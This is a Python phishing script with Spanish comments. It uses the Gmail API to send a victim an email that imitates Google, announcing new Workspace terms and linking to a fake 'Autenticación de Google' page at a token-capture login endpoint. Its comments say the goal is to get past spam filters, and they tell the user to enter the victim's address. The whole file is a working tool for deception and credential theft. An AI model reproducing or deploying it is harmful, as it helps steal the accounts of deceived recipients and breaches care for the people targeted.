from google.oauth2.credentials import Credentials
from google.auth.transport.requests import Request
from googleapiclient.discovery import build
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import hashlib

# Este script sirve para evitar que el mensaje se  marque como  spam o peligroso
# Configuración de la API de Gmail
SCOPES = ['https://www.googleapis.com/auth/gmail.send']
SENDER = 'AQUI DEBES DE INGRESAR EL CORREO  QUE ENVIARA LOS  MENSAJES'
CLIENT_ID = 'CLIENTE ID  DE GOOGLE WORKSPACE'
CLIENT_SECRET = 'CLIENTE  SECRETO DE  GOOGLE WORKSPACE' 
REFRESH_TOKEN = 'AQUI DEBES PONER EL  REFRESH TOKEN DEL CORREO QUE ENVIARA LOS MENSAJES'
# Todo esto se ocupa de tu GOOGLE  WORKSPACE LO DE ARRIBA

def create_message(sender, to, subject, body):
    """Create a message for an email."""
    message = MIMEMultipart('alternative')
    message['to'] = to
    message['from'] = sender
    message['subject'] = subject

    # Enlace de autenticación
    auth_url = 'https://tu_url_de_autenticacion_google'
    shortened_auth_url = shorten_url(auth_url)

    # Create HTML message with simpler styles
    html_body = """
    <html>
    <body style="font-family: Arial, sans-serif; background-color: #f2f2f2; margin: 0; padding: 20px;">
    <div style="background-color: #ffffff; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); max-width: 600px; margin: auto;">
        <h1 style="color: #333333;">{}</h1>
        <p style="color: #666666;">{}</p>
        <p style="color: #666666;">Para autenticarse:</p>
        <p><a href="{}" style="color: #007bff; text-decoration: none;">Autenticación de Google</a></p>
        <div style="margin-top: 20px; font-size: 12px; color: #999999;">
            <p>Si tiene alguna pregunta, no dude en contactarnos.</p>
            <p>Saludos,</p>
            <p>El equipo de BotProg</p>
        </div>
    </div>
    </body>
    </html>
    """.format(subject, body, shortened_auth_url)

    message.attach(MIMEText(html_body, 'html'))
    return {'raw': base64.urlsafe_b64encode(message.as_bytes()).decode()}

def shorten_url(url):
    """Shorten a URL using a simple hash."""
    # You can use any method to generate a unique short URL, here we use a simple hash
    hashed = hashlib.sha1(url.encode()).hexdigest()[:8]
    return f'http://localhost/captoken/login.php'  # Replace 'tu_domino' with your own domain

def send_email(service, user_id, message):
    """Send an email."""
    try:
        message = (service.users().messages().send(userId=user_id, body=message)
                   .execute())
        print('Message Id: %s' % message['id'])
        return message
    except Exception as error:
        print('An error occurred: %s' % error)
        return None

def main():
    # Autenticación y autorización
    creds = Credentials(
        token=None,
        client_id=CLIENT_ID,
        client_secret=CLIENT_SECRET,
        refresh_token=REFRESH_TOKEN,
        token_uri='https://oauth2.googleapis.com/token',
        scopes=SCOPES
    )

    if not creds.valid:
        creds.refresh(Request())

    # Construir servicio de Gmail
    service = build('gmail', 'v1', credentials=creds)

    # Crear mensaje
    to = 'VICTIMA@EJEMPLO.com'  # AQUI DEBES AGREGAR EL CORREO DE LA VICTIMA
    subject = 'Nuevos términos y condiciones en SUITE G'
    body = 'Hola USUARIO, mira nuestros nuevos términos y condiciones: ext.'
    message = create_message(SENDER, to, subject, body)

    # Enviar correo electrónico
    send_email(service, 'me', message)

if __name__ == "__main__":
    main()
